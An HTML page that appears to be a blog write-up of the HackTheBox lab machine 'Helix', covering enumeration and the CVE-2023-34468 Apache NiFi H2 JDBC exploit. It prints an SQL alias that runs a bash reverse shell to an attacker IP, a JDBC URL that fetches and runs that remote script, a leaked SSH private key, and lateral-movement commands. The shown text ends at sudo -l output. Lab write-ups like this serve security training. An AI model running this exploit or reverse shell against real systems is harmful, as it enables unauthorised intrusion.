@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Helix HTB | z1rov</title>
+  <meta name="description" content="Helix (HTB, Linux) is built around an industrial-automation theme with a three-stage chain. Foothold comes from CVE-2023-34468, an unauth H2 JDBC injection in Apache NiFi 1.21.0 sitting on a hidden vhost — gets you code exec as nifi. From there a leaked SSH key inside a NiFi support bundle hands you operator. A cracked PDF on that user's desktop reveals an OPC UA endpoint and the reactor's documented hazard threshold; writing straight to the writable telemetry nodes forces a fake hazard state, which tricks a sudo-gated &quot;break-glass&quot; console into dropping a root shell. Solid box for practicing RE-adjacent web app abuse plus a genuinely different privesc angle instead of the usual SUID/cron stuff." />
+  <meta name="author"      content="z1rov" />
+  <meta name="robots"      content="index, follow" />
+  <meta name="keywords"    content="oscp, cpts, bscp, apache nifi, cve-2023-34468, hackthebox, linux privilege escalation, jdbc injection, lateral movement, credential exposure, ssh key leak" />
+  <link rel="canonical"    href="https://www.zirov.net/writeups/helix-htb.html" />
+  <meta property="og:type"                content="article" />
+  <meta property="og:title"               content="Helix HTB | z1rov" />
+  <meta property="og:description"         content="Helix (HTB, Linux) is built around an industrial-automation theme with a three-stage chain. Foothold comes from CVE-2023-34468, an unauth H2 JDBC injection in Apache NiFi 1.21.0 sitting on a hidden vhost — gets you code exec as nifi. From there a leaked SSH key inside a NiFi support bundle hands you operator. A cracked PDF on that user's desktop reveals an OPC UA endpoint and the reactor's documented hazard threshold; writing straight to the writable telemetry nodes forces a fake hazard state, which tricks a sudo-gated &quot;break-glass&quot; console into dropping a root shell. Solid box for practicing RE-adjacent web app abuse plus a genuinely different privesc angle instead of the usual SUID/cron stuff." />
+  <meta property="og:url"                 content="https://www.zirov.net/writeups/helix-htb.html" />
+  <meta property="og:site_name"           content="z1rov" />
+  <meta property="og:image"              content="https://img.zirov.net/helix-htb/helix-htb.png" />
+  <meta property="og:image:width"        content="1200" />
+  <meta property="og:image:height"       content="630" />
+  <meta property="og:image:alt"          content="Helix HTB — z1rov" />
+  <meta property="og:locale"             content="en_US" />
+  <meta property="article:author"         content="z1rov" />
+  <meta property="article:published_time" content="2026-08-08" />
+  <meta property="article:tag" content="oscp">
+  <meta property="article:tag" content="cpts">
+  <meta property="article:tag" content="bscp">
+  <meta property="article:tag" content="apache nifi">
+  <meta property="article:tag" content="cve-2023-34468">
+  <meta property="article:tag" content="hackthebox">
+  <meta property="article:tag" content="linux privilege escalation">
+  <meta property="article:tag" content="jdbc injection">
+  <meta property="article:tag" content="lateral movement">
+  <meta property="article:tag" content="credential exposure">
+  <meta property="article:tag" content="ssh key leak">
+  <meta name="twitter:card"        content="summary_large_image" />
+  <meta name="twitter:title"       content="Helix HTB | z1rov" />
+  <meta name="twitter:description" content="Helix (HTB, Linux) is built around an industrial-automation theme with a three-stage chain. Foothold comes from CVE-2023-34468, an unauth H2 JDBC injection in Apache NiFi 1.21.0 sitting on a hidden vhost — gets you code exec as nifi. From there a leaked SSH key inside a NiFi support bundle hands you operator. A cracked PDF on that user's desktop reveals an OPC UA endpoint and the reactor's documented hazard threshold; writing straight to the writable telemetry nodes forces a fake hazard state, which tricks a sudo-gated &quot;break-glass&quot; console into dropping a root shell. Solid box for practicing RE-adjacent web app abuse plus a genuinely different privesc angle instead of the usual SUID/cron stuff." />
+  <meta name="twitter:image"       content="https://img.zirov.net/helix-htb/helix-htb.png" />
+  <meta name="twitter:image:alt"   content="Helix HTB — z1rov" />
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Helix HTB",
+    "description": "Helix (HTB, Linux) is built around an industrial-automation theme with a three-stage chain. Foothold comes from CVE-2023-34468, an unauth H2 JDBC injection in Apache NiFi 1.21.0 sitting on a hidden vhost — gets you code exec as nifi. From there a leaked SSH key inside a NiFi support bundle hands you operator. A cracked PDF on that user's desktop reveals an OPC UA endpoint and the reactor's documented hazard threshold; writing straight to the writable telemetry nodes forces a fake hazard state, which tricks a sudo-gated \"break-glass\" console into dropping a root shell. Solid box for practicing RE-adjacent web app abuse plus a genuinely different privesc angle instead of the usual SUID/cron stuff.",
+    "image": "https://img.zirov.net/helix-htb/helix-htb.png",
+    "author": {
+      "@type": "Person",
+      "name": "z1rov",
+      "url": "https://www.zirov.net/page/about.html"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "z1rov",
+      "url": "https://www.zirov.net/"
+    },
+    "datePublished": "2026-08-08",
+    "dateModified":  "2026-08-08",
+    "url": "https://www.zirov.net/writeups/helix-htb.html",
+    "keywords": ["oscp", "cpts", "bscp", "apache nifi", "cve-2023-34468", "hackthebox", "linux privilege escalation", "jdbc injection", "lateral movement", "credential exposure", "ssh key leak"],
+    "articleSection": "Writeups",
+    "inLanguage": "en"
+  }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&family=Outfit:wght@400;500;600;700;800&family=Barlow:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/styles.css">
+  <link rel="stylesheet" href="../css/search.css">
+  <link rel="stylesheet" href="../css/post.css">
+  <link rel="stylesheet" href="../css/collapse.css">
+</head>
+<body>
+<header class="topbar">
+  <button class="hamburger" id="hamburgerBtn" aria-label="Open menu" aria-controls="menuPanel" aria-expanded="false">
+    <span class="hamburger-bar"></span>
+    <span class="hamburger-bar"></span>
+    <span class="hamburger-bar"></span>
+  </button>
+  <a class="logo-wrap" href="/">
+    <svg class="logo-icon" viewBox="-0.5 -0.5 262 270" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#c82525" d="M -0.5,-0.5 C 86.8333,-0.5 174.167,-0.5 261.5,-0.5C 261.5,89.5 261.5,179.5 261.5,269.5C 174.167,269.5 86.8333,269.5 -0.5,269.5C -0.5,179.5 -0.5,89.5 -0.5,-0.5 Z"/>
+      <path fill="#f9f8f8" d="M 121.5,149.5 C 120.244,149.461 119.244,149.961 118.5,151C 143.831,151.5 169.164,151.667 194.5,151.5C 194.5,159.167 194.5,166.833 194.5,174.5C 151.167,174.5 107.833,174.5 64.5,174.5C 64.169,166.472 64.5023,158.472 65.5,150.5C 90.1104,140.298 114.777,130.298 139.5,120.5C 140.289,120.217 140.956,119.717 141.5,119C 115.835,118.5 90.1688,118.333 64.5,118.5C 64.5,110.833 64.5,103.167 64.5,95.5C 108.167,95.5 151.833,95.5 195.5,95.5C 195.831,103.528 195.498,111.528 194.5,119.5C 170.143,129.506 145.809,139.506 121.5,149.5 Z"/>
+    </svg>
+    <span class="logo-text">z1ro<em>v</em></span>
+  </a>
+  <div class="topbar-right">
+    <div class="icon-group">
+      <button class="icon-btn search-btn" aria-label="Search" id="search-toggle">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      </button>
+      <button class="icon-btn" id="themeBtn" aria-label="Toggle theme">
+        <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+        <svg class="i-sun"  viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32 1.41 1.41M2 12h2m16 0h2M4.93 19.07l1.41-1.41m11.32-11.32 1.41-1.41"/></svg>
+      </button>
+    </div>
+    <a href="https://discord.gg/4nnsYWjbUk" target="_blank" rel="noopener" class="btn-join">
+      <svg viewBox="0 0 24 24" fill="currentColor" style="width:12px;height:12px;flex-shrink:0"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
+      <span class="btn-join-full">Join Community</span>
+      <span class="btn-join-short">z1sec</span>
+    </a>
+    <a href="../page/about.html" class="avatar">
+      <img src="../img/profile.png" alt="z1rov" onerror="this.style.display='none'">
+    </a>
+  </div>
+</header>
+<div class="menu-panel-overlay" id="menuPanelOverlay"></div>
+<div class="menu-panel" id="menuPanel">
+  <nav class="menu-panel-nav">
+    <a href="../page/archives.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/></svg>
+      <span>Archives</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <a href="../page/notes.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"/></svg>
+      <span>Notes</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <a href="../page/tags.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z"/></svg>
+      <span>Tags</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <a href="../page/projects.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/></svg>
+      <span>Projects</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <a href="../page/about.html" class="menu-panel-link">
+      <svg class="menu-panel-link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
+      <span>About Me</span>
+      <svg class="menu-panel-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+    </a>
+    <button type="button" class="menu-panel-link menu-theme-toggle" id="themeBtnMobile" aria-label="Toggle theme" onclick="document.documentElement.setAttribute('data-theme', document.documentElement.getAttribute('data-theme')==='dark' ? 'light' : 'dark')">
+      <svg class="menu-panel-link-icon i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+      <svg class="menu-panel-link-icon i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32 1.41 1.41M2 12h2m16 0h2M4.93 19.07l1.41-1.41m11.32-11.32 1.41-1.41"/></svg>
+      <span>Theme</span>
+    </button>
+  </nav>
+</div>
+  <main class="layout">
+    <article class="col-featured post-article">
+      <header class="post-header">
+        <div class="post-breadcrumb">
+          <a href="/">Home</a><span class="sep">›</span>
+          <a href="../page/writeups.html">Writeups</a><span class="sep">›</span>
+          <span>Helix HTB</span>
+        </div>
+        <h1 class="post-title">Helix HTB</h1>
+        <div class="post-meta">
+          <span class="post-date"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Aug 8, 2026</span>
+          <span class="post-dot">·</span>
+          <span class="post-words"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg><span>3,008 words</span></span>
+          <span class="post-dot">·</span>
+          <span class="post-readtime"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span>16 min</span></span>
+        </div>
+        <div class="post-tags"><a href="../page/tags.html#oscp" class="tag">oscp</a>
+                  <a href="../page/tags.html#cpts" class="tag">cpts</a>
+                  <a href="../page/tags.html#bscp" class="tag">bscp</a>
+                  <a href="../page/tags.html#apache-nifi" class="tag">apache nifi</a>
+                  <a href="../page/tags.html#cve-2023-34468" class="tag">cve-2023-34468</a>
+                  <a href="../page/tags.html#hackthebox" class="tag">hackthebox</a>
+                  <a href="../page/tags.html#linux-privilege-escalation" class="tag">linux privilege escalation</a>
+                  <a href="../page/tags.html#jdbc-injection" class="tag">jdbc injection</a>
+                  <a href="../page/tags.html#lateral-movement" class="tag">lateral movement</a>
+                  <a href="../page/tags.html#credential-exposure" class="tag">credential exposure</a>
+                  <a href="../page/tags.html#ssh-key-leak" class="tag">ssh key leak</a></div>
+      </header>
+      <img class="post-cover" src="https://img.zirov.net/helix-htb/helix-htb.png" alt="Helix HTB cover" onerror="this.style.display='none'"/>
+      <div class="post-content">
+<h2>Summary</h2>
+<p>Helix is a Linux machine built around an industrial-automation theme. The foothold is obtained through <strong>CVE-2023-34468</strong>, an unauthenticated remote code execution vulnerability in an Apache NiFi instance discovered on a hidden virtual host, which is abused via a malicious H2 database connection string to gain code execution as the <code>nifi</code> service user. Local enumeration uncovers a backed-up SSH private key that pivots us to the <code>operator</code> user. From there, a password-protected PDF is cracked to reveal an internal OPC UA endpoint and a maintenance procedure; by manipulating simulated sensor values over OPC UA we force the system into a documented hazard state, which causes the safety controller to open a maintenance window and allows <code>operator</code> to run a restricted sudo binary that drops into a root shell. End to end, an attacker with no credentials and only network access to the web application reaches full root compromise of the host.</p>
+<p><strong>Attack chain:</strong> HTTP enumeration → vhost discovery (<code>flow.helix.htb</code>) → Apache NiFi 1.21.0 → CVE-2023-34468 (H2 JDBC RCE) → foothold as <code>nifi</code> → leaked SSH key → lateral movement to <code>operator</code> → cracked PDF reveals OPC UA endpoint and hazard threshold → sensor manipulation crosses threshold → <code>/opt/helix/state/maintenance_window</code> flag set → sudo <code>helix-maint-console</code> → root.</p>
+<h2>Information Gathering</h2>
+<h3>TCP</h3>
+<p>Full TCP scan across all 65535 ports:</p>
+<pre><code class="lang-bash">nmap -p- --open -sS --min-rate 5000 -Pn -n -T4 10.129.245.123 -oX scan.xml
+</code></pre>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2026-08-07 20:06 UTC
+Nmap scan report for 10.129.245.123
+Host is up (0.17s latency).
+Not shown: 64902 closed tcp ports (reset), 631 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds
+</code></pre>
+<p>Service/version detection on the open ports:</p>
+<pre><code class="lang-bash">nmap -p22,80 -sCV 10.129.245.123 -oN info_10.129.245.123
+</code></pre>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2026-08-07 20:07 UTC
+Nmap scan report for helix.htb (10.129.245.123)
+Host is up (0.17s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 60b3f76c0b92ab00ace712e1d1269c1e (ECDSA)
+|_  256 c830e6cbc6cdfc0c39e534042007b9b3 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Helix Industries | Industrial Automation &amp; Critical Infrastruc...
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
+</code></pre>
+<p>Only SSH and HTTP are exposed, narrowing the attack surface to the web application. We add the hostname to <code>/etc/hosts</code>:</p>
+<pre><code class="lang-bash">echo '10.129.245.123 helix.htb' | sudo tee -a /etc/hosts
+</code></pre>
+<h2>Enumeration</h2>
+<h3>HTTP</h3>
+<p>We check for virtual hosting by fuzzing the <code>Host</code> header against the base domain:</p>
+<pre><code class="lang-bash">ffuf -u http://helix.htb/ -H &quot;Host: FUZZ.helix.htb&quot; -w /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -fw 4
+</code></pre>
+<pre><code>        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://helix.htb/
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.helix.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 4
+________________________________________________
+
+flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 180ms]
+:: Progress: [5000/5000] :: Job [1/1] :: 682 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
+</code></pre>
+<p>A hidden vhost <code>flow.helix.htb</code> is discovered. We add it to <code>/etc/hosts</code> and browse to it:</p>
+<pre><code class="lang-bash">echo '10.129.245.123 flow.helix.htb' | sudo tee -a /etc/hosts
+</code></pre>
+<p>The page is a login portal for Apache NiFi:</p>
+<img src="https://img.zirov.net/helix-htb/17306683290469499067.png" alt="flow.helix.htb — Apache NiFi login page" />
+<p>About <a href="https://nifi.apache.org/" target="_blank" rel="noopener noreferrer">Apache NiFi</a>:</p>
+<blockquote>
+<p><em>Apache NiFi</em> is an open-source dataflow automation tool that lets users build, schedule, and monitor data pipelines through a drag-and-drop web UI, wiring together &quot;processors&quot; and &quot;controller services&quot; (e.g. database connection pools) to move and transform data between systems.</p>
+</blockquote>
+<p>Fingerprinting the interface confirms the running version as <strong>1.21.0</strong>:</p>
+<img src="https://img.zirov.net/helix-htb/27517034185273997092.png" alt="NiFi version banner confirming 1.21.0" />
+<h2>Exploitation</h2>
+<h3>CVE-2023-34468 — Apache NiFi H2 Database RCE</h3>
+<p><strong>Vulnerability:</strong> Apache NiFi versions prior to 1.21.0's patch expose the <code>DBCPConnectionPool</code> controller service, which allows a user with canvas access to configure an arbitrary JDBC connection string. Because NiFi bundles the H2 database driver, a crafted H2 JDBC URL can use the <code>INIT=RUNSCRIPT FROM '&lt;url&gt;'</code> parameter to fetch and execute an attacker-controlled SQL script at connection time. H2's <code>RUNSCRIPT</code> directive permits <code>CREATE ALIAS</code> statements, which map directly to arbitrary Java static methods — defining an alias that calls <code>Runtime.getRuntime().exec()</code> executes arbitrary OS commands as the NiFi service user as soon as the connection pool initializes.</p>
+<p>We stage a malicious SQL script, <code>rce.sql</code>, that defines a command-execution alias and immediately invokes a reverse shell:</p>
+<pre><code class="lang-sql">CREATE ALIAS X AS $$
+void x(String c) throws Exception {
+    Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;, &quot;-c&quot;, c});
+}
+$$;
+CALL X('bash -i &gt;&amp; /dev/tcp/10.10.15.169/9001 0&gt;&amp;1');
+</code></pre>
+<p>We host it over HTTP:</p>
+<pre><code class="lang-bash">python3 -m http.server 8000
+</code></pre>
+<p>And, in a separate terminal, start a listener:</p>
+<pre><code class="lang-bash">penelope -p 9001
+</code></pre>
+<p>In the NiFi UI we right-click on the canvas and select <strong>Configure</strong> from the context menu:</p>
+<img src="https://img.zirov.net/helix-htb/62106176919347404066.png" alt="Right-clicking the canvas to open Configure" />
+<p>From the configuration view we switch to the <strong>Controller Services</strong> tab:</p>
+<img src="https://img.zirov.net/helix-htb/53211437203482704479.png" alt="Selecting the Controller Services tab" />
+<p>We locate the existing <strong>DBCPConnectionPool</strong> service in the list:</p>
+<img src="https://img.zirov.net/helix-htb/74046025029081769711.png" alt="Locating the DBCPConnectionPool service" />
+<p>Opening its configuration, we set the <strong>Database Connection URL</strong> to point at our hosted script via H2's init-script parameter, and set the <strong>Database Driver Class Name</strong> to the H2 driver:</p>
+<p><strong>Database Connection URL:</strong></p>
+<pre><code>jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://10.10.15.169:8000/rce.sql'
+</code></pre>
+<p><strong>Database Driver Class Name:</strong></p>
+<pre><code>org.h2.Driver
+</code></pre>
+<img src="https://img.zirov.net/helix-htb/11615316597851901414.png" alt="DBCPConnectionPool configured with the malicious JDBC URL and H2 driver class" />
+<p>We enable the service, which triggers the JDBC connection and executes our script:</p>
+<img src="https://img.zirov.net/helix-htb/40982259083267546310.png" alt="Enabling the DBCPConnectionPool service" />
+<p>To reliably re-trigger the connection on demand rather than relying solely on the initial enable event, we drag a new processor onto the canvas:</p>
+<img src="https://img.zirov.net/helix-htb/04835159978536214327.png" alt="Dragging a new processor onto the canvas" />
+<p>and add <strong>ExecuteSQL</strong> from the processor list:</p>
+<img src="https://img.zirov.net/helix-htb/69572249865750049682.png" alt="Selecting ExecuteSQL from the processor list" />
+<p>We open the processor's configuration:</p>
+<img src="https://img.zirov.net/helix-htb/61632052824352144747.png" alt="Opening the ExecuteSQL processor configuration" />
+<p>In the <strong>Properties</strong> tab we set the <strong>Database Connection Pooling Service</strong> to the <code>DBCPConnectionPool</code> service configured earlier, and set the <strong>SQL select query</strong> property to a trivial <code>1</code>:</p>
+<img src="https://img.zirov.net/helix-htb/28157272938173498651.png" alt="Setting Database Connection Pooling Service and SQL select query to 1" />
+<p>Finally, we route the processor's relationships to <strong>terminate</strong> and start it:</p>
+<img src="https://img.zirov.net/helix-htb/65656928760123620957.png" alt="Routing the processor's relationships to terminate" />
+<p>Starting the processor forces the connection pool to re-initialize, which re-runs the SQL script. The listener catches the reverse shell as the <code>nifi</code> service user:</p>
+<img src="https://img.zirov.net/helix-htb/36580360866525947485.png" alt="NiFi bulletin notifications alongside the received reverse shell" />
+<h2>Lateral Movement</h2>
+<h3>Local Enumeration</h3>
+<pre><code class="lang-bash">find /opt /home /var -name &quot;*.pem&quot; -o -name &quot;*.key&quot; -o -name &quot;*id_*&quot; 2&gt;/dev/null
+</code></pre>
+<pre><code>/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
+/var/lib/fwupd/pki/secret.key
+/var/lib/fwupd/pki/client.pem
+</code></pre>
+<p>A backed-up SSH private key for the <code>operator</code> account sits inside a NiFi support bundle:</p>
+<pre><code class="lang-bash">cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
+</code></pre>
+<pre><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
+WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
+AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
+tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<h3>Lateral Movement Vector</h3>
+<p><strong>Vulnerability:</strong> The <code>nifi</code> service user has read access to a support-bundle directory containing a stale, unencrypted backup of the <code>operator</code> user's SSH private key — a leftover from a diagnostic export that was never cleaned up. Since the key is unprotected, it can be used directly for authentication as <code>operator</code>.</p>
+<pre><code class="lang-bash">chmod 600 id_rsa
+ssh -i id_rsa operator@helix.htb
+</code></pre>
+<pre><code>operator@helix:~$ whoami
+operator
+operator@helix:~$ id
+uid=1001(operator) gid=1001(operator) groups=1001(operator)
+</code></pre>
+<pre><code class="lang-bash">hostname &amp;&amp; whoami &amp;&amp; ip addr &amp;&amp; cat user.txt
+</code></pre>
+<pre><code>helix
+operator
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether a2:de:ad:be:ce:49 brd ff:ff:ff:ff:ff:ff
+    altname enp3s0
+    altname ens160
+    inet 10.129.245.123/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 3079sec preferred_lft 3079sec
+    inet6 dead:beef::a0de:adff:febe:ce49/64 scope global dynamic mngtmpaddr 
+       valid_lft 86399sec preferred_lft 14399sec
+    inet6 fe80::a0de:adff:febe:ce49/64 scope link 
+       valid_lft forever preferred_lft forever
+616f4ec6a46dc5b31a0faecf695e****
+</code></pre>
+<h2>Privilege Escalation</h2>
+<h3>Local Enumeration</h3>
+<pre><code class="lang-bash">sudo -l
+</code></pre>
+<pre><code>Matching Defaults entries for operator on helix:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User operator may run the following commands on helix:
+    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
+</code></pre>
